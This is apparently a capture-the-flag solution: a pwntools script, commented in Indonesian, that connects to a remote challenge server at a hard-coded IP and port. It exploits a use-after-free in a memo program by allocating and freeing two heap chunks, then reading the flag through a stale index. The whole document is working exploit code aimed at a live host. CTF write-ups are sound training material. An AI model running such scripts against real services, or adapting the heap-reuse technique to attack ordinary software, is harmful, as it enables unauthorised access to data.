from pwn import *

# r = process("./reuse_memo")
r = remote("128.199.104.41",28544)

def new_memo(a,b):
	r.sendlineafter("Choice: ","1")
	r.sendlineafter("Index: ",a)
	r.sendlineafter("Enter memo (max 32 characters, no overflow, we use fgets :D): ",b)

def delete_memo(a):
	r.sendlineafter("Choice: ","3")
	r.sendlineafter("Index: ",a)

def flag():
	r.sendlineafter("Choice: ","4")
	r.sendlineafter("Allocate to what index? ","1")
	r.sendlineafter("Choice: ","2")
	r.sendlineafter("Index: ","2")

new_memo("1","A") # nambahin data baru ke index 1
new_memo("2","A") # nambahin data baru ke index 1
delete_memo("1") # hapus data index 1, pointer ke awal heap
delete_memo("2") # hapus data index 2, pointer ke index 1
flag() # Masukkin flag ke index 1, tapi pindah ke index 2 karena pointer
r.interactive() # Nampilin flag
